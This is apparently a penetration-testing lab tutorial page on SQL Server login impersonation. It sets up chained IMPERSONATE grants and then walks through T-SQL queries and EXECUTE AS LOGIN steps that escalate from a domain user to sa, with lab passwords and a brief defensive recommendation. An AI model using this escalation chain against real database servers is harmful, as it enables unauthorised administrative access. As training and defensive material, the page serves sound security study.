---
description: >-
  SQL Server has a special permission, named impersonate, this enables one user
  to operate with the permissions of another user as well as their own
  permissions.
---

# Impersonation

## Configuring

### Prerequisite

{% content-ref url="../initial-access/normal-domain-user-access.md" %}
[normal-domain-user-access.md](../initial-access/normal-domain-user-access.md)
{% endcontent-ref %}

### Configuring

1. Login to `WEB01` as the `Administrator` user with password `Welcome01!`.
2. Open "Microsoft SQL Server Management Studio"

![](<../../../../.gitbook/assets/image (34) (1) (1) (1) (1) (1) (1).png>)

3\. Login with the `Administrator` user using Windows Authentication.

![](<../../../../.gitbook/assets/image (7) (1) (1) (1).png>)

4\. Click “New Query” button and use the SQL query below to create two new users:

![](<../../../../.gitbook/assets/image (29) (1) (1) (1).png>)

```
CREATE LOGIN Developer WITH PASSWORD = 'MyPassword!';
CREATE LOGIN Developer_test WITH PASSWORD = 'MyPassword!';
```

![](<../../../../.gitbook/assets/image (50) (1).png>)

5\. Run the following Query to allow impersonation:

```
GRANT IMPERSONATE ON LOGIN::Developer to [AMSTERDAM\Richard];
GRANT IMPERSONATE ON LOGIN::Developer_test to [Developer];
GRANT IMPERSONATE ON LOGIN::sa to [Developer_test];
```

![](<../../../../.gitbook/assets/image (36) (1) (1).png>)

## Attacking

### How it works

SQL Server has a special permission, named impersonate, this enables one user to operate with the permissions of another user as well as their own permissions. For example: user A can impersonate user B which can impersonate user C which can impersonate sa. This can be used to escalate privileges.

### Tools

* [HeidiSQL](https://www.heidisql.com/)

### Executing the attack

1. Login to `WS01` as Richard with the password `Sample123`.
2. Download and start heidiSQL.
3. Click on "New" on the left bottom and configure the following settings:

* Network Type: `Microsoft SQL Server (TCP/IP)`
* Library: `SQLOLEDB`
* Hostname / IP: `WEB01.amsterdam.bank.local`
* Select: "Use Windows Authentication"
* Port: `1433`

![](<../../../../.gitbook/assets/image (33) (1) (1) (1) (1).png>)

4\. Click "OK" on the security Issue warning.

5\. Click on the "Query" tab and enter the following Query to check which users can be impersonated by the current user.

```
-- Find users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

We can impersonate the `Developer` user.

![](<../../../../.gitbook/assets/image (62) (1) (1) (1) (1) (1) (1) (1) (1).png>)

6\. Impersonate the `Developer` user with the following query.

```
EXECUTE AS LOGIN = 'developer'
```

![](<../../../../.gitbook/assets/image (42) (1) (1).png>)

{% hint style="info" %}
Make sure the Master database is selected since the developer user doesn't have access to the production database.
{% endhint %}

7\. Execute the who can be impersonated query again.

![](<../../../../.gitbook/assets/image (52) (1) (1) (1) (1) (1).png>)

8\. Impersonate the user `sa`.

```
EXECUTE AS LOGIN = 'sa'
```

![](<../../../../.gitbook/assets/image (42) (1).png>)

Hmm that doesn't work, lets impersonate `Developer_test`

8\. Impersonate `Developer_test`.

```
EXECUTE AS LOGIN = 'Developer_test'
```

9\. Execute the who can be impersonated query again:

![](<../../../../.gitbook/assets/image (7) (1) (1).png>)

10\. Impersonate `sa`.

```
EXECUTE AS LOGIN = 'sa'
```

Now no error:

![](<../../../../.gitbook/assets/image (43) (1) (1).png>)

We successfully impersonated `Developer` --> `Developer_test` --> `sa`.

Check the executing commands page under SQL Server Attacks to read how to execute cmd commands:

{% content-ref url="../executing-commands.md" %}
[executing-commands.md](../executing-commands.md)
{% endcontent-ref %}

## Defending

### Recommendations

* Use signed stored procedures that have been assigned access to external objects. This seems like the most secure option with the least amount of management overhead. Similar to the EXECUTE WITH option, this can result in escalation paths if the store procedure is vulnerable to SQL injection, or is simply written to allow users to take arbitrary actions. More information at [http://msdn.microsoft.com/en-us/library/bb283630.aspx](http://msdn.microsoft.com/en-us/library/bb283630.aspx).

### Detection



## References

{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation" %}
